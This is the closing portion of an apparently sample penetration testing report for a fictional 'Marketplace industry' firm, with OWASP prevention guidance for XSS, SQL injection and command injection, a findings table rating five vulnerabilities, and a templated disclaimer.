![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/28a9fc83-c1cf-401f-aa64-0406bf8bcf6c)

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/41248b3a-0d1b-42ff-8c62-48b1261ed36d)

Full Documentation:
<ul>
  <li>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</li>
  <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li>
</ul>

<b>SQL Injection Prevention</b><br>
<br>
<b>SQL Injection</b> issues occur when software developers build dynamic database queries with string concatenation that contain user-supplied input. It is simple to avoid SQL injection problems. Developers must either: a) cease developing dynamic queries with string concatenation; or b) prevent malicious SQL in user-supplied input from altering the logic of the performed query. <br>
Example:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/a6c9dabd-c1cd-4f9a-9828-9367353dfc2d)

Full Documentation:
<ul>
  <li>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li>
</ul>

<b>Command Injection Defense Cheat Sheet</b><br>
<br>
<b>Command injection</b> (also known as OS Command Injection) is a sort of injection in which software that builds a system command using externally influenced input fails to properly neutralize the input from specific elements that can affect the initially intended command.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/38a4b856-e4e5-4c82-b212-cc240e71b3ad)

Full Documentation:
<ul>
  <li>https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</li>
</ul>

<h3>Conclusion</h3>

<b>Marketplace industry</b> experienced a series of control failures, resulting in the total compromise of crucial corporate assets. If a malicious actor had exploited these flaws, they would have had a significant impact on Marketplace industry operations. Current password reuse policies and deployed access controls are insufficient to mitigate the effect of the reported vulnerabilities.<br>
<br>

The penetration test's precise objectives were stated as follows:
<ul>
  <li>Identifying if a remote attacker could penetrate Marketplace industry’s defenses </li>
  <li>The effectiveness of an organization's security policy.</li>
  <li>Confidentiality of the company’s private data.</li>
  <li>Internal infrastructure and availability of Marketplace’s information systems.</li>
  <li>Reduce risk of attack: Mimicking real hacker behaviors provides greater visibility into your organization’s weakness.</li>
  <li>Backdoors in the operating system</li>
</ul>  

These penetration test objectives were met. A targeted attack on Marketplace industry can completely damage organizational assets. Multiple flaws were exploited in conjunction, leading in a total penetration of Marketplace industry’s information systems. It is vital to highlight that the failure of Marketplace industry’s entire security infrastructure may be ascribed in large part to insufficient access controls at both the network boundary and host levels. Appropriate efforts should be made to implement appropriate Web Application defenses like prevention of XSS, SQL Injection and Command Injection vulnerabilities, which could aid in mitigating the impact of cascading security failures across the Marketplace industry infrastructure.

<table>
  <tr>
    <th>Issue No.</th>
    <th>Description</th>
    <th>Risk Rating</th>
  </tr>
  <tr>
    <td>Issue 1</td>
    <td>Cross Site Scripting</td>
    <td>High</td>
  </tr>
  <tr>
    <td>Issue 2</td>
    <td>SQL Injection</td>
    <td>High</td>
  </tr>
  <tr>
    <td>Issue 3</td>
    <td>Command Injection</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>Issue 4</td>
    <td>Tar file with Wildcard - Privilege Escalation</td>
    <td>Low</td>
  </tr>
  <tr>
    <td>Issue 5</td>
    <td>Docker - Privilege Escalation</td>
    <td>Low</td>
  </tr>
</table>

Marketplace industry’s security team must follow the OWASP ModSecurity Core Rule Set (CRS), which is a collection of generic attack detection rules that may be used with ModSecurity or other compatible web application firewalls.
<br>
<br>
<h3>Disclaimer</h3>

<b>Ethical Security</b> company conducted this testing on the applications and systems that existed as of [ORIGINALTESTDATE]. Information
security threats are continually changing, with new vulnerabilities discovered on a daily basis, and no application can ever be 100%
secure no matter how much security testing is conducted. This report is intended only to provide documentation that [CLIENT] has
corrected all findings noted by High Bit Security as of [REMEDIATIONTESTDATE].
This report cannot and does not protect against personal or business loss as the result of use of the applications or systems
described. High Bit Security offers no warranties, representations or legal certifications concerning the applications or systems it
tests. All software includes defects: nothing in this document is intended to represent or warrant that security testing was complete
and without error, nor does this document represent or warrant that the application tested is suitable to task, free of other defects
than reported, fully compliant with any industry standards, or fully compatible with any operating system, hardware, or other
application. By using this information you agree that High Bit Security shall be held harmless in any event.
<br>
<br>
<b>***THIS IS ONLY AN EXAMPLE OF A PENETRATION TESTING PROCEDURE AND A FINAL REPORT***</b>


